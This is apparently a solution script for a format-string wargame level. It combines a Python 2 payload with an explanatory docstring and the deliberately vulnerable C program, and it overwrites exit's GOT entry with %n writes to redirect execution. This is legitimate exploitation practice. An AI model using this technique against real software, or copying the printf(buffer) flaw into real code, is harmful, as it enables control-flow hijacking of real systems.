"""
It's done by exploiting the %n format string vulnerability,
it can write the number of the printed character into variable.
In this case, we use that %n vuln to write variable to GOT (Global Offset Table)
We overwrite the GOT value by splitting into 4 bytes.
So first we write the last 84b4 and then we write the last 804 wich is 10804
- %4$n means that we will overwrite the GOT with 4th address on the stack.
- %5$n means that we will overwrite the GOT with 5th address on the stack.
- EXIT_PLT+2 means that we will write the 804 / first 3 bytes.
- Removing the AAAA means that we adjust the offset so we have place for the EXIT_PLT+2

C Code :
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
"""

import struct

HELL0 = 0x80484b4
EXIT_PLT = 0x8049724

def pad(s):
        return s+"X"*(512-len(s))

exploit = ""
exploit += struct.pack("I", EXIT_PLT)
exploit += struct.pack("I", EXIT_PLT+2)
exploit += "BBBBCCCC"
exploit += "%4$33956x"
exploit += "%4$n"
exploit += "%33616x"
exploit += "%5$n"

print pad(exploit)
